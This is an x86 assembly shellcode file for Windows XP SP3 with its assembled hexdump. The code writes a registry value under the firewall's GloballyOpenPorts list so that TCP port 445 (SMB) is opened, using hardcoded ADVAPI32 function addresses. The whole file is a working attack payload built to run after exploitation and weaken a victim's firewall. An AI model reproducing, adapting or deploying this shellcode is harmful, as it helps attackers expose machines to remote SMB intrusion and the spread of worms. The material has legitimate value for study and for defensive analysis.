; Author: sinn3r (x90.sinner {a.t} gmail.c0m)
; Tested on Windows XP SP3
; Description:
; This shellcode will create a XP firewall rule to allow TCP traffic on port 445.
; Make sure ADVAPI32.dll is loaded.

[BITS 32]

global _start

_start:

;for the handle
xor edx, edx
mov edi, esp
mov dword [edi], edx
sub esp, 0x10		;avoid handle being overwritten

;Prepare the key
push 0x00747369
push 0x4c5c7374
push 0x726f506e
push 0x65704f79
push 0x6c6c6162
push 0x6f6c475c
push 0x656c6966
push 0x6f725064
push 0x7261646e
push 0x6174535c
push 0x7963696c
push 0x6f706c6c
push 0x61776572
push 0x69465c73
push 0x72657465
push 0x6d617261
push 0x505c7373
push 0x65636341
push 0x64657261
push 0x68535c73
push 0x65636976
push 0x7265535c
push 0x7465536c
push 0x6f72746e
push 0x6f43746e
push 0x65727275
push 0x435c4d45
push 0x54535953
mov edx, esp

xor eax, eax
push eax		;pDisposion = NULL
push edi		;pHandle
push eax		;pSecurity = NULL
push 0x0f003f		;Access = KEY_ALL_ACCESS
push eax		;Options = REG_OPTION_NON_VOLATILE
push eax		;Class = NULL
push eax		;Reserved = NULL
push edx		;Subkey
push 0x80000002		;hkey = HKEY_LOCAL_MACHINE
mov eax, 0x77DDE9E4	;RegCreateKeyExA
call eax

;RegSetValue ValueName = 445:TCP
push 0x00504354
push 0x3a353434
mov edx, esp

;REgSEtValue buffer = 445:TCP:*:Enabled:test
push 0x00007473
push 0x65743a64
push 0x656c6261
push 0x6e453a2a
push 0x3a504354
push 0x3a353434
mov ecx, esp

xor eax, eax
inc eax
push 0x16		;BufSize = 0x16
push ecx		;Buffer
push eax		;ValueType = REG-SZ
dec eax
push eax		;Reserved = 0
push edx		;ValueName
push dword [edi]	;hKey
mov eax, 0x77ddead7	;RegSetValueExA
call eax

push dword [edi]	;hKey
mov eax, 0x77dd6c17	;RegCloseKey
call eax

;shellcode:
;sinn3r@backtrack:~$ nasm -f bin addFirewallRule2.asm -o addFirewallRule2 |cat addFirewallRule2 |hexdump -C |grep -v 000000ff
;00000000  31 d2 89 e7 89 17 81 ec  10 00 00 00 68 69 73 74  |1...........hist|
;00000010  00 68 74 73 5c 4c 68 6e  50 6f 72 68 79 4f 70 65  |.hts\LhnPorhyOpe|
;00000020  68 62 61 6c 6c 68 5c 47  6c 6f 68 66 69 6c 65 68  |hballh\Glohfileh|
;00000030  64 50 72 6f 68 6e 64 61  72 68 5c 53 74 61 68 6c  |dProhndarh\Stahl|
;00000040  69 63 79 68 6c 6c 70 6f  68 72 65 77 61 68 73 5c  |icyhllpohrewahs\|
;00000050  46 69 68 65 74 65 72 68  61 72 61 6d 68 73 73 5c  |Fiheterharamhss\|
;00000060  50 68 41 63 63 65 68 61  72 65 64 68 73 5c 53 68  |PhAcceharedhs\Sh|
;00000070  68 76 69 63 65 68 5c 53  65 72 68 6c 53 65 74 68  |hviceh\SerhlSeth|
;00000080  6e 74 72 6f 68 6e 74 43  6f 68 75 72 72 65 68 45  |ntrohntCohurrehE|
;00000090  4d 5c 43 68 53 59 53 54  89 e2 31 c0 50 57 50 68  |M\ChSYST..1.PWPh|
;000000a0  3f 00 0f 00 50 50 50 52  68 02 00 00 80 b8 e4 e9  |?...PPPRh.......|
;000000b0  dd 77 ff d0 68 54 43 50  00 68 34 34 35 3a 89 e2  |.w..hTCP.h445:..|
;000000c0  68 73 74 00 00 68 64 3a  74 65 68 61 62 6c 65 68  |hst..hd:tehableh|
;000000d0  2a 3a 45 6e 68 54 43 50  3a 68 34 34 35 3a 89 e1  |*:EnhTCP:h445:..|
;000000e0  31 c0 40 68 16 00 00 00  51 50 48 50 52 ff 37 b8  |1.@h....QPHPR.7.|
;000000f0  d7 ea dd 77 ff d0 ff 37  b8 17 6c dd 77 ff d0     |...w...7..l.w..|